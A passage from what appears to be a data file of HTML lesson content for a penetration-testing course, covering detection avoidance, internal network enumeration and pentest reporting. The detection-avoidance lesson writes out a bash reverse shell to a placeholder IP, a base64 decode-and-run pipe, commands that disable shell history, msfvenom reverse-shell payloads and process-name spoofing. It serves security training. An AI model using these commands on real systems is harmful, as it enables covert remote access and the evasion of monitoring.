          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Detection Avoidance Techniques',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Detection Avoidance Techniques</h2>
            <p class="mb-4 text-gray-300">
              Detection Avoidance focuses on staying invisible to security controls such as antivirus (AV), EDR, IDS/IPS, SIEM, and logging mechanisms. After gaining access, attackers reduce noise so they can operate longer without triggering alerts. This does not mean being undetectable — it means lowering indicators of compromise (IOCs).
            </p>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Why Detection Avoidance Is Critical</h3>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
              <li>Modern networks are heavily monitored</li>
              <li>Loud attacks are stopped quickly</li>
              <li>Silent attacks survive longer</li>
              <li>Post‑exploitation activity is closely watched</li>
            </ul>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Common Detection Mechanisms</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>Antivirus & EDR</li>
                <li>Command-line logging</li>
                <li>Process monitoring</li>
                <li>Network traffic analysis</li>
                <li>File integrity monitoring</li>
                <li>User behavior analytics</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Detection Avoidance Techniques</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>Living‑off‑the‑Land (LOLBins)</li>
                <li>Obfuscating commands & scripts</li>
                <li>Avoiding known malicious binaries</li>
                <li>Reducing command execution frequency</li>
                <li>Clearing or minimizing logs (carefully)</li>
                <li>Using encrypted communication channels</li>
              </ul>
            </div>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Detection Avoidance Tools)</h3>
            <div class="bg-yellow-900/30 border border-yellow-700/50 p-3 rounded mb-4">
              <p class="text-yellow-200 text-sm">
                ⚠️ <span class="font-semibold">Warning:</span> Use strictly in legal red-team labs.
              </p>
            </div>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: Obfuscation via Linux Built‑ins (LOLBins)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Use base64 encoding to hide payload</span>
                    <code class="text-green-400 block font-mono text-sm">echo "bash -i >& /dev/tcp/IP/4444 0>&1" | base64</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Decode and execute silently</span>
                    <code class="text-green-400 block font-mono text-sm">echo "ENCODED_STRING" | base64 -d | bash</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Execute commands without history</span>
                    <code class="text-green-400 block font-mono text-sm">export HISTFILE=/dev/null</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Disable command history temporarily</span>
                    <code class="text-green-400 block font-mono text-sm">set +o history</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Use env to execute commands quietly</span>
                    <code class="text-green-400 block font-mono text-sm">env bash -c "id"</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Metasploit Evasion Techniques</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Generate obfuscated payload</span>
                    <code class="text-green-400 block font-mono text-sm">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -e x64/xor</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Increase encoding iterations</span>
                    <code class="text-green-400 block font-mono text-sm">msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -i 5 -f elf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Use staged payloads</span>
                    <code class="text-green-400 block font-mono text-sm">set payload linux/x64/meterpreter/reverse_tcp</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Run payload in memory</span>
                    <code class="text-green-400 block font-mono text-sm">./payload & disown</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Hide process name</span>
                    <code class="text-green-400 block font-mono text-sm">exec -a systemd ./payload</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Real-World Insight</h3>
            <p class="text-gray-300 mb-4">
              Detection avoidance failures usually happen because attackers:
            </p>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm mb-4">
              <li>Run tools too fast</li>
              <li>Use known signatures</li>
              <li>Ignore logging mechanisms</li>
            </ul>
            <p class="text-gray-300 text-sm font-medium">
              Key Takeaway: Blue teams catch attackers after foothold, not during exploitation.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Internal Network Enumeration',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Internal Network Enumeration</h2>
            <p class="mb-4 text-gray-300">
              Internal Network Enumeration is the process of mapping the internal environment after gaining access. Once inside, attackers try to understand network structure, connected systems, and trust relationships. This stage directly enables lateral movement and domain compromise.
            </p>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Goals of Internal Enumeration</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>Identify live hosts</li>
                <li>Discover open ports & services</li>
                <li>Detect internal servers (DB, AD, file servers)</li>
                <li>Find high‑value targets</li>
                <li>Understand trust paths</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">What Attackers Look For</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>Domain controllers</li>
                <li>Database servers</li>
                <li>File shares</li>
                <li>Backup servers</li>
                <li>Legacy systems</li>
                <li>Internal web applications</li>
              </ul>
            </div>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Internal Enumeration Tools)</h3>
            <div class="bg-yellow-900/30 border border-yellow-700/50 p-3 rounded mb-4">
              <p class="text-yellow-200 text-sm">
                ⚠️ <span class="font-semibold">Warning:</span> For authorized testing environments only.
              </p>
            </div>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: Nmap (Internal Network Mapping)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Identify local IP and subnet</span>
                    <code class="text-green-400 block font-mono text-sm">ip addr</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Ping scan entire subnet</span>
                    <code class="text-green-400 block font-mono text-sm">nmap -sn 192.168.1.0/24</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Scan top ports on live hosts</span>
                    <code class="text-green-400 block font-mono text-sm">nmap -sS -T4 192.168.1.0/24</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Service version detection</span>
                    <code class="text-green-400 block font-mono text-sm">nmap -sV 192.168.1.10</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. OS detection</span>
                    <code class="text-green-400 block font-mono text-sm">nmap -O 192.168.1.10</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Netdiscover (Passive Network Discovery)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Start passive discovery</span>
                    <code class="text-green-400 block font-mono text-sm">netdiscover</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Active scan on interface</span>
                    <code class="text-green-400 block font-mono text-sm">netdiscover -i eth0</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Scan specific subnet</span>
                    <code class="text-green-400 block font-mono text-sm">netdiscover -r 192.168.1.0/24</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Show only active hosts</span>
                    <code class="text-green-400 block font-mono text-sm">netdiscover -p</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Save output</span>
                    <code class="text-green-400 block font-mono text-sm">netdiscover -r 192.168.1.0/24 > netdiscover.txt</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <p class="text-gray-300 mb-4">
              Internal enumeration is less noisy than external scanning, but still monitored in secure environments.
            </p>
            <p class="text-gray-300 text-sm mb-2">Smart attackers:</p>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
              <li>Scan slowly</li>
              <li>Focus on specific subnets</li>
              <li>Avoid full‑range scans repeatedly</li>
            </ul>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Summary',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Summary – Post‑Exploitation Techniques</h2>
            <p class="mb-4 text-gray-300">
              Post‑Exploitation is the phase where an attacker converts access into control, intelligence, and long‑term impact. Everything after initial access defines whether an attack succeeds or fails. This module focused on what happens after “hacking in.”
            </p>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">What We Covered in Module 8</h3>
            <ul class="list-disc pl-5 space-y-2 text-gray-300 text-sm">
              <li><strong class="text-white">Privilege Escalation:</strong> Turning low‑level access into root or administrator control</li>
              <li><strong class="text-white">Foothold Creation:</strong> Stabilizing shells and maintaining reliable access</li>
              <li><strong class="text-white">Persistence:</strong> Surviving reboots, logouts, and service restarts</li>
              <li><strong class="text-white">Lateral Movement:</strong> Expanding from one machine to many</li>
              <li><strong class="text-white">Credential & Token Dumping:</strong> Stealing identities to move silently</li>
              <li><strong class="text-white">Detection Avoidance:</strong> Reducing visibility to security tools</li>
              <li><strong class="text-white">Internal Network Enumeration:</strong> Mapping the real attack surface</li>
            </ul>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Attackers focus on:</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>Misconfigurations</li>
                <li>Trust relationships</li>
                <li>Reused credentials</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Defenders focus on:</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>Least privilege</li>
                <li>Monitoring persistence points</li>
                <li>Credential protection</li>
                <li>Network segmentation</li>
              </ul>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Reality</h3>
            <p class="text-gray-300 mb-4">
              Most real breaches:
            </p>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm mb-4">
              <li>Do not use zero‑days</li>
              <li>Abuse poor configurations</li>
              <li>Succeed because detection is slow</li>
            </ul>
            <p class="text-gray-300 text-sm mb-4">
              Post‑exploitation is where advanced attackers outperform beginners.
            </p>
            <p class="text-gray-300 mt-4 text-sm font-medium border-t border-[#333] pt-4">
              Key Takeaway: Initial access gets headlines. Post‑exploitation decides the outcome.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      }
    ]
  },
  {
    id: 'module-9',
    title: 'Module 9: Reporting & Communication in Cyber Security',
    duration: '1 week',
    description: 'Develop essential skills for documenting and communicating security findings.',
    lessons: [
      {
        title: 'Introduction to Security Reporting',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Introduction to Security Reporting</h2>
            <p class="mb-4 text-gray-300">
              Security Reporting is the process of documenting findings from a security assessment in a clear, structured, and professional manner so that clients, management, and technical teams can understand and act on them. A penetration test is incomplete without a report. If exploitation proves you can break in, reporting proves you know what you’re doing.
            </p>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Why Security Reporting Is Critical</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>Converts technical attacks into business risk</li>
                <li>Helps organizations fix vulnerabilities</li>
                <li>Acts as legal and contractual evidence</li>
                <li>Demonstrates professional credibility</li>
                <li>Required for compliance (ISO, SOC, PCI‑DSS)</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Who Reads Security Reports</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li><strong class="text-white">Executives:</strong> Want impact & risk</li>
                <li><strong class="text-white">Managers:</strong> Want prioritization</li>
                <li><strong class="text-white">Developers / SysAdmins:</strong> Want reproduction steps & fixes</li>
              </ul>
              <p class="text-gray-400 text-xs mt-2 italic">A good report speaks to all three audiences.</p>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Core Principles of Good Reporting</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h4 class="text-sm font-semibold text-gray-200 mb-1">Do:</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Clear, concise, and factual</li>
                  <li>Evidence‑based (screenshots, logs, PoCs)</li>
                  <li>No exaggeration or fear‑mongering</li>
                  <li>Actionable remediation guidance</li>
                  <li>Ethical and confidential</li>
                </ul>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-gray-200 mb-1">Do NOT:</h4>
                <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>Raw tool output</li>
                  <li>Full of jargon without explanation</li>
                  <li>Offensive or judgmental</li>
                  <li>Missing proof</li>
                </ul>
              </div>
            </div>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Reporting & Documentation Tools)</h3>
            <div class="bg-yellow-900/30 border border-yellow-700/50 p-3 rounded mb-4">
              <p class="text-yellow-200 text-sm">
                ⚠️ <span class="font-semibold">Warning:</span> Used during authorized assessments only.
              </p>
            </div>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: CherryTree (Manual Reporting & Notes)</h4>
                <p class="text-gray-400 text-sm mb-3">Widely used by pentesters for structured documentation.</p>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Install CherryTree</span>
                    <code class="text-green-400 block font-mono text-sm">sudo apt install cherrytree</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Launch CherryTree</span>
                    <code class="text-green-400 block font-mono text-sm">cherrytree</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Create new reporting file</span>
                    <code class="text-green-400 block font-mono text-sm">File → New → CherryTree Document</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Create nodes for findings</span>
                    <code class="text-green-400 block font-mono text-sm">Right Click → Add Node</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Attach screenshots & evidence</span>
                    <code class="text-green-400 block font-mono text-sm">Node → Insert → Image / File</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Dradis Framework (Collaboration & Reporting)</h4>
                <p class="text-gray-400 text-sm mb-3">Professional reporting and collaboration platform.</p>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Install Dradis</span>
                    <code class="text-green-400 block font-mono text-sm">sudo apt install dradis</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Start Dradis service</span>
                    <code class="text-green-400 block font-mono text-sm">dradis</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Access web interface</span>
                    <code class="text-green-400 block font-mono text-sm">http://127.0.0.1:3000</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Create new project</span>
                    <code class="text-green-400 block font-mono text-sm">Projects → New Project</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Import scan results (Nmap example)</span>
                    <code class="text-green-400 block font-mono text-sm">Upload → Nmap XML</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <p class="text-gray-300 mb-4">
              Clients don’t pay for tools — they pay for clarity and risk understanding. A clean report can be more valuable than a complex exploit.
            </p>
            <p class="text-gray-300 mt-4 text-sm font-medium border-t border-[#333] pt-4">
              Key Takeaway: A great hacker who can’t report is just a technician. A great report turns hacking into a profession.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Components of a Good Penetration Testing Report',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Components of a Good Penetration Testing Report</h2>
            <p class="mb-4 text-gray-300">
              A penetration testing report is a structured document that explains what was tested, what was found, how it was exploited, and how to fix it. This report must be technically accurate, easy to understand, and actionable. A weak report can invalidate even a strong penetration test.
            </p>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Core Components of a Professional Pentest Report</h3>
            <ol class="list-decimal pl-5 space-y-2 text-gray-300 text-sm">
              <li>
                <strong class="text-white">Cover Page:</strong> Client name, assessment type, date, tester info, confidentiality notice.
              </li>
              <li>
                <strong class="text-white">Table of Contents:</strong> Essential for navigating large documents.
              </li>
              <li>
                <strong class="text-white">Executive Summary:</strong> Non‑technical overview, business impact, overall security posture.
              </li>
              <li>
                <strong class="text-white">Scope & Methodology:</strong> What was tested (and excluded), testing approach used.
              </li>
              <li>
                <strong class="text-white">Risk Rating Methodology:</strong> CVSS or custom risk model (likelihood vs impact).
              </li>
              <li>
                <strong class="text-white">Findings & Vulnerabilities:</strong> Detailed technical issues, evidence, and reproduction steps.
              </li>
              <li>
                <strong class="text-white">Remediation Recommendations:</strong> Clear, practical fixes and prioritized actions.
              </li>
              <li>
                <strong class="text-white">Conclusion:</strong> Overall assessment result and next steps.
              </li>
              <li>
                <strong class="text-white">Appendix:</strong> Tool versions, raw outputs (optional).
              </li>
            </ol>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Common Reporting Mistakes</h3>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
              <li>Dumping tool output without explanation</li>
              <li>Using vague risk descriptions</li>
              <li>Missing screenshots or proof</li>
              <li>Not mapping findings to business impact</li>
            </ul>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Report Structuring Tools)</h3>
            <div class="bg-yellow-900/30 border border-yellow-700/50 p-3 rounded mb-4">
              <p class="text-yellow-200 text-sm">
                ⚠️ <span class="font-semibold">Warning:</span> Used in authorized security assessments.
              </p>
            </div>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: PwnDoc (Modern Pentest Reporting)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Clone PwnDoc</span>
                    <code class="text-green-400 block font-mono text-sm">git clone https://github.com/pwndoc/pwndoc.git</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Navigate to directory</span>
                    <code class="text-green-400 block font-mono text-sm">cd pwndoc</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Start Docker containers</span>
                    <code class="text-green-400 block font-mono text-sm">docker-compose up -d</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Access web interface</span>
                    <code class="text-green-400 block font-mono text-sm">http://localhost:3000</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Export report (PDF/Word)</span>
                    <code class="text-green-400 block font-mono text-sm">Reports → Generate</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Markdown + Pandoc (Custom Reports)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Create report file</span>
                    <code class="text-green-400 block font-mono text-sm">nano report.md</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Convert Markdown to PDF</span>
                    <code class="text-green-400 block font-mono text-sm">pandoc report.md -o report.pdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Convert to Word document</span>
                    <code class="text-green-400 block font-mono text-sm">pandoc report.md -o report.docx</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Add cover page template</span>
                    <code class="text-green-400 block font-mono text-sm">pandoc report.md --template=template.tex -o report.pdf</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Version control report</span>
                    <code class="text-green-400 block font-mono text-sm">git init && git add report.md && git commit -m "Initial report"</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <p class="text-gray-300 mb-4">
              Top security firms spend more time writing reports than exploiting systems. Clarity beats complexity.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Writing Executive Summaries',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Writing Executive Summaries</h2>
            <p class="mb-4 text-gray-300">
              The Executive Summary is the most read and valued section of a penetration testing report. It is intended for managers, executives, and decision-makers who may not understand technical details. The goal: communicate risk, impact, and recommendations clearly without jargon.
            </p>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Key Elements of an Executive Summary</h3>
            <div class="space-y-4">
              <div>
                <h4 class="text-sm font-semibold text-white">Objective</h4>
                <p class="text-gray-400 text-sm">Why the test was conducted, scope, and duration.</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Overall Security Posture</h4>
                <p class="text-gray-400 text-sm">High-level findings and trend (good, fair, poor).</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Critical Findings</h4>
                <p class="text-gray-400 text-sm">Only high- and medium-risk issues. Include business impact.</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Recommendations</h4>
                <p class="text-gray-400 text-sm">High-level remediation steps and prioritized actions.</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Conclusion</h4>
                <p class="text-gray-400 text-sm">General assessment statement and next steps for the organization.</p>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Tips for Writing Executive Summaries</h3>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
              <li>Use non-technical language</li>
              <li>Include graphics for risk levels (charts, heatmaps)</li>
              <li>Focus on business impact, not tools used</li>
              <li>Keep it short and precise (1–2 pages)</li>
              <li>Avoid blame; focus on improvement</li>
            </ul>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Tools for Creating Executive Summaries)</h3>
            <div class="bg-yellow-900/30 border border-yellow-700/50 p-3 rounded mb-4">
              <p class="text-yellow-200 text-sm">
                ⚠️ <span class="font-semibold">Note:</span> Focus on visual and professional presentation.
              </p>
            </div>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: Microsoft PowerPoint / LibreOffice Impress</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Open presentation software</span>
                    <code class="text-green-400 block font-mono text-sm">libreoffice --impress</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Create slides for:</span>
                    <code class="text-gray-400 block font-mono text-sm">Objective, Security posture, Critical findings, Recommendations, Conclusion</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Insert charts for risk levels</span>
                    <code class="text-green-400 block font-mono text-sm">Insert → Chart → Pie / Bar</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Add images/screenshots from report</span>
                    <code class="text-green-400 block font-mono text-sm">Insert → Image</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Export to PDF</span>
                    <code class="text-green-400 block font-mono text-sm">File → Export As → PDF</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Canva (Visual Executive Summary)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Open Canva web</span>
                    <code class="text-green-400 block font-mono text-sm">https://www.canva.com</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Select template</span>
                    <code class="text-green-400 block font-mono text-sm">"Business Report"</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Add sections</span>
                    <code class="text-gray-400 block font-mono text-sm">Scope, Key Findings, Recommendations</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Add visual charts/infographics</span>
                    <code class="text-gray-400 block font-mono text-sm">Elements → Charts</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Download final summary as PDF</span>
                    <code class="text-green-400 block font-mono text-sm">Share → Download → PDF Standard</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <p class="text-gray-300 mb-4">
              Executives rarely read technical sections. A clear, concise, visually appealing executive summary is often the most valued part of a pentest report.
            </p>
            <p class="text-gray-300 mt-4 text-sm font-medium border-t border-[#333] pt-4">
              Key Takeaway: Think of the Executive Summary as the “story of the attack” for decision-makers: What happened, How it affects the business, What actions to take.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Documenting Vulnerabilities & Evidence',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Documenting Vulnerabilities & Evidence</h2>
            <p class="mb-4 text-gray-300">
              Documenting vulnerabilities and evidence is the heart of a penetration test report. It ensures that technical findings are verifiable, reproducible, and actionable. Without proper documentation, remediation becomes confusing or impossible.
            </p>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">What to Document for Each Vulnerability</h3>
            <div class="space-y-4">
              <div>
                <h4 class="text-sm font-semibold text-white">Title / Vulnerability Name</h4>
                <p class="text-gray-400 text-sm">Example: “SQL Injection in Login Form”</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Affected System / Component</h4>
                <p class="text-gray-400 text-sm">IP address, application, service, or URL</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Risk Level / Severity</h4>
                <p class="text-gray-400 text-sm">High, Medium, Low (CVSS scoring recommended)</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Description</h4>
                <p class="text-gray-400 text-sm">Technical details, impact, and how it was discovered</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Steps to Reproduce (PoC)</h4>
                <p class="text-gray-400 text-sm">Clear step-by-step instructions</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Evidence / Proof</h4>
                <p class="text-gray-400 text-sm">Screenshots, logs, capture files, tool outputs</p>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-white">Recommendation / Remediation</h4>
                <p class="text-gray-400 text-sm">Specific, actionable advice</p>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Best Practices</h3>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
              <li>Use screenshots wherever possible</li>
              <li>Highlight the critical step in evidence</li>
              <li>Avoid sensitive client information in shared templates</li>
              <li>Group vulnerabilities by category or risk</li>
            </ul>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Tools for Documentation)</h3>
            <div class="bg-yellow-900/30 border border-yellow-700/50 p-3 rounded mb-4">
              <p class="text-yellow-200 text-sm">
